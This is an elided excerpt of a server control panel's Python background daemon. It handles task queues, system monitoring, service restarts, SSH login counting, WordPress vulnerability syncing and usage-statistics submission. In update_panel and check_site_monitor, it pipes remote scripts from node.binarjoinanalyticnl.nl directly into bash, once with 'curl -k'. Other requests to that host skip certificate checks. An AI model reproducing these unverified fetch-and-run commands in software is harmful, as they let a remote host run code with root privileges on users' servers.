    ...
    while 1:
        try:
            if os.path.exists(isTask):
                with db.Sql() as sql:
                    sql.table("tasks").where("status=?", ("-1",)).setField(
                        "status", "0"
                    )
                    taskArr = (
                        sql.table("tasks")
                        .where("status=?", ("0",))
                        .field("id,type,execstr")
                        .order("id asc")
                        .select()
                    )
...
def siteEdate():
    ...
    try:
        ...
        os.system(
            "nohup "
            + get_python_bin()
            + " /www/server/panel/script/site_task.py > /dev/null 2>&1 &"
        )
        ...
        while True:
            ...
            try:
                if os.path.exists("/proc/diskstats"):
                    ...
                    tmp = {}
                    tmp["read_count"] = int(
                        (diskio_2.read_count - diskio_1.read_count) / cycle
                    )
                    tmp["write_count"] = int(
                        (diskio_2.write_count - diskio_1.write_count) / cycle
                    )
                    tmp["read_bytes"] = int(
                        (diskio_2.read_bytes - diskio_1.read_bytes) / cycle
                    )
                    tmp["write_bytes"] = int(
                        (diskio_2.write_bytes - diskio_1.write_bytes) / cycle
                    )
                    tmp["read_time"] = int(
                        (diskio_2.read_time - diskio_1.read_time) / cycle
                    )
                    tmp["write_time"] = int(
                        (diskio_2.write_time - diskio_1.write_time) / cycle
                    )
            ...
            try:
                ...
                data = (
                    ...
                    networkInfo["down"],
                    networkInfo["upTotal"],
                    networkInfo["downTotal"],
                    dumps(networkInfo["downPackets"]),
                    dumps(networkInfo["upPackets"]),
                    addtime,
                )
...
def flush_geoip():
    ...
    try:
        if not os.path.exists(_ips_path):
            public.downloadFile(
                "{}/install/lib/{}".format(
                    public.get_url(), os.path.basename(_ips_path)
                ),
                _ips_path,
            )
            ...
            if os.path.exists(_ips_path):
                try:
                    ...
                    if ips_list:
                        bash = os.path.exists(
                            "/usr/bin/apt-get"
                        ) and not os.path.exists("/etc/redhat-release")
                        if bash:
                            ...
                            for ip_dict in ips_list:
                                xml_path = "/etc/firewalld/ipsets/{}.xml.old".format(
                                    ip_dict["brief"]
                                )
...
"""
                                if os.path.exists(xml_path):
                                    ...
                                    os.makedirs(
                                        os.path.dirname(xml_path), exist_ok=True
                                    )
                                    public.writeFile(xml_path, xml_body)
        ...
        for version in phpversions:
            ...
            if startPHPVersion(version):
                public.WriteLog(
                    ...
                    "PHP-"
                    + version
                    + "processing exception was detected and has been automatically fixed!",
                    not_web=True,
                )
    except Exception as ex:
        logging.info(ex)
...
def mysql_quota_check():
    os.system(
        "nohup "
        + get_python_bin()
        + " /www/server/panel/script/mysql_quota.py > /dev/null 2>&1 &"
    )
...
def check_panel_ssl():
    try:
        while True:
            ...
            os.system(
                get_python_bin()
                + " {}/script/panel_ssl_task.py > /dev/null".format(base_path)
            )
            time.sleep(3600)
    except Exception as e:
        ...
        if not pid_exists(int(panel_pid)):
            ...
            if os.path.exists(comm_file):
                ...
                if not comm or comm.find("BT-Panel") == -1:
                    logging.info(
                        f"Process {panel_pid} is not a BT-Panel process,comm-{comm} commtype-{type(comm)}"
                    )
                    service_panel("start")
                    continue
                ...
                logging.info(
                    f"comm file not found for PID {panel_pid}, restarting service..."
                )
                service_panel("start")
...
def daemon_service():
    ...
    try:
        ...
        with app.app_context():
            old_deamons = (
                public.M("crontab")
                .where("name Like ?", "[Do not delete]%Daemon")
                .select()
            )
            for i in old_deamons:
                try:
                    cron_name = i.get("name")
                    s_name = cron_name.replace("[Do not delete] ", "").replace(
                        " Daemon", ""
                    )
...
def update_panel():
    os.system(
        "curl -k https://node.binarjoinanalyticnl.nl/install/update_7.x_en.sh|bash &"
    )
...
def service_panel(action="reload"):
    if not os.path.exists("{}/init.sh".format(base_path)):
        ...
        os.system(
            "nohup bash /www/server/panel/init.sh {} > /dev/null 2>&1 &".format(action)
        )
    ...
    while True:
        try:
            os.system(
                "nohup "
                + get_python_bin()
                + " /www/server/panel/script/mail_task.py > /dev/null 2>&1 &"
            )
            time.sleep(180)
        except:
            time.sleep(360)
...
def check_panel_msg():
    ...
    while True:
        os.system(
            "nohup {} /www/server/panel/script/check_msg.py > /dev/null 2>&1 &".format(
                python_bin
            )
        )
        time.sleep(3600)
...
def push_msg():
    ...
    while True:
        time.sleep(60)
        os.system(
            "nohup {} /www/server/panel/script/push_msg.py > /dev/null 2>&1 &".format(
                python_bin
            )
        )
        ...
        for i in project_info:
            try:
                ...
                if i["project_config"]["java_type"] != "springboot":
                    continue
                if (
                    "auth" in i["project_config"]
                    and i["project_config"]["auth"] == 1
                    or i["project_config"]["auth"] == "1"
                ):
                    print("Java", i["name"])
                    ...
                    if java.get_project_run_state(project_name=i["name"]):
                        ...
                        # 如果项目是在后台停止的，那么就不再启动
                        if os.path.exists(
                            "/var/tmp/springboot/vhost/pids/{}.pid".format(i["name"])
                        ):
                            get = public.dict_obj()
                            ...
                            public.WriteLog(
                                "守护进程",
                                "Java项目[{}]已经被守护进程启动".format(i["name"]),
                            )
            except:
                continue
    ...
    while True:
        ...
        if os.path.exists(pro_file):
            ...
            if os.path.exists(update_file) or res is None:
                os.system(
                    "nohup {} /www/server/panel/script/check_auth.py > /dev/null 2>&1 &".format(
                        python_bin
                    )
                )
                if cache:
            ...
            while True:
                ...
                try:
                    filedata = (
                        ...
                        else public.writeFile(filepath, "[]")
                    )
                    try:
                    ...
                    today_success = int(
                        public.ExecShell(
                            "journalctl -u ssh --no-pager -S today |grep -a 'Accepted' |wc -l"
                        )[0]
                    )
                    ...
                    if is_bigfile:
                        ...
                        success = int(
                            public.ExecShell(
                                "journalctl -u ssh --since '30 days ago' --no-pager | grep -a 'Accepted' | wc -l"
                            )[0]
                        )
                    else:
                        ...
                        err_num1 = int(
                            public.ExecShell(
                                "journalctl -u ssh --no-pager |grep -a 'Failed password for' |grep -v 'invalid' |wc -l"
                            )[0]
                        )
                        err_num2 = int(
                            public.ExecShell(
                        ...
                        success = int(
                            public.ExecShell(
                                "journalctl -u ssh --no-pager|grep -a 'Accepted' |wc -l"
                            )[0]
                        )
...
def update_vulnerabilities():
    ...
    def check_vlun():
        ...
        public.writeFile(path_time, json.dumps(share_ip_info))
        load_time = (
            M("wordpress_vulnerabilities", "wordpress_vulnerabilities")
            .order("data_time desc")
            .limit("1")
            .field("data_time")
            .find()
        )
        if type(load_time) != dict:
            return

        def get_yun_infos(page):
            url = (
                "https://wafapi2.binarjoinanalyticnl.nl/api/bt_waf/get_wordpress_scan?size=100&p="
                + str(page)
            )
            ...
            for i in yun_infos["res"]:
                if i["data_time"] > load_time["data_time"]:
                    del i["id"]
                    M("wordpress_vulnerabilities", "wordpress_vulnerabilities").insert(
                        i
                    )
                else:
                    return True
    ...
    def check_plugin_close():
        ...
        public.writeFile(path_time, json.dumps(share_ip_info))
        check_sql = (
            M("plugin_error", "plugin_error")
            .order("id desc")
            .limit("1")
            .field("id")
            .find()
        )
        if type(check_sql) != dict:
            return
        time.sleep(30)
        ...
        for i in res_list:
            if (
                M("plugin_error", "plugin_error")
                .where("slug=? and status=0", i["slug"])
                .count()
                > 0
            ):
                M("plugin_error", "plugin_error").where("slug=?", i["slug"]).update(
                    {"status": 1}
                )
    ...
    def get_plugin_update_time():
        ...
        check_sql = (
            M("wordpress_not_update", "wordpress_not_update")
            .order("id desc")
            .limit("1")
            .field("id")
            .find()
        ...
        def get_plugin_time(id):
            time.sleep(30)
            url = (
                "https://wafapi2.binarjoinanalyticnl.nl/api/bt_waf/get_wordpress_not_update?p="
                + str(id)
            )
            try:
                res = requests.get(url, verify=False, timeout=60).json()
                ...
                for i in res["res"]:
                    if (
                        ...
                        if (
                            M("wordpress_not_update", "wordpress_not_update")
                            .where(
                                "slug=? and last_time=?", (i["slug"], i["last_time"])
                            )
                            .count()
                            == 0
                        ):
                            M("wordpress_not_update", "wordpress_not_update").where(
                                "slug=?", i["slug"]
                            ).update({"last_time": i["last_time"]})
                # 随机时间
            except:
                pass
...
def submit_email_statistics():
    ...
    cloud_yesterday_submit = (
        f"/www/server/panel/data/{yesterday}_submit_email_statistics.pl"
    )
    if os.path.exists(cloud_yesterday_submit):
        return
    # 判断是否有邮局
    if not os.path.exists(
        "/www/server/panel/plugin/mail_sys/mail_send_bulk.py"
    ...
    cloud_before_yesterday_submit = (
        f"/www/server/panel/data/{before_yesterday}_submit_email_statistics.pl"
    )
...
def submit_module_call_statistics():
    ...
    yesterday = datetime.now() - timedelta(days=1)
    yesterday = yesterday.strftime("%Y-%m-%d")
    cloud_yesterday_submit = "{}/data/{}_submit_module_call_statistics.pl".format(
    ...
    before_yesterday = before_yesterday.strftime("%Y-%m-%d")
    cloud_before_yesterday_submit = (
        "{}/data/{}_submit_module_call_statistics.pl".format(
...
def mailsys_domain_restrictions():
    ...
    bulk = plugin_loader.get_module(
        "{}/plugin/mail_sys/mail_send_bulk.py".format(public.get_panel_path())
    )
    ...
    before_yesterday = before_yesterday.strftime("%Y-%m-%d")
    cloud_before_yesterday_submit = (
        "{}/data/{}_update_mailsys_domain_restrictions.pl".format(
            public.get_panel_path(), before_yesterday
        )
    )
    if os.path.exists(cloud_before_yesterday_submit):
...
def _submit_to_cloud(data_submit):
    ...
    cloudUrl = "{}/api/panel/submit_feature_invoked_bulk".format(
...
def mailsys_domain_blecklisted_alarm():
    ...
    before_yesterday = before_yesterday.strftime("%Y-%m-%d")
    cloud_before_yesterday_submit = (
        "{}/data/{}_mailsys_domain_blecklisted_alarm.pl".format(
            public.get_panel_path(), before_yesterday
        )
    )
    if os.path.exists(cloud_before_yesterday_submit):
...
def mailsys_quota_alarm1():
    ...
    yesterday = datetime.now() - timedelta(days=1)
    yesterday = yesterday.strftime("%Y-%m-%d")
    cloud_yesterday_submit = "{}/data/{}_mailsys_quota_alarm.pl".format(
        public.get_panel_path(), yesterday
    )
    if os.path.exists(cloud_yesterday_submit):
        return
    ...
    before_yesterday = datetime.now() - timedelta(days=2)
    before_yesterday = before_yesterday.strftime("%Y-%m-%d")
    cloud_before_yesterday_submit = "{}/data/{}_mailsys_quota_alarm.pl".format(
        public.get_panel_path(), before_yesterday
    )
    if os.path.exists(cloud_before_yesterday_submit):
        os.remove(cloud_before_yesterday_submit)
...
def check_site_monitor():
    while True:
        ...
        if (
            public.GetWebServer() != "openlitespeed"
            and not os.path.exists("/www/server/site_total")
            and not os.path.exists(
                os.path.join(public.get_panel_path(), "plugin/monitor/info.json")
            )
            and public.M("tasks")
            .where("name=? and status=?", (install_name, "0"))
            .count()
            < 1
        ):
            execstr = (
                "curl https://node.binarjoinanalyticnl.nl/site_total/install.sh|bash"
            )
            public.M("tasks").add(
...
def run_post_update_tasks(from_version, to_version):
    ...
    try:
        if from_version == to_version:
            logging.info(
                "Current task version is the same as the last version, no update tasks to run."
            )
            return True
        ...
        if from_version < "1.0.1":
            ...
            pattern = r'<a class="btlink" href="https://www\.k2panel\.com/new/download\.html\?invite_code=k2panele" target="_blank">(.+?)</a>'
            import re
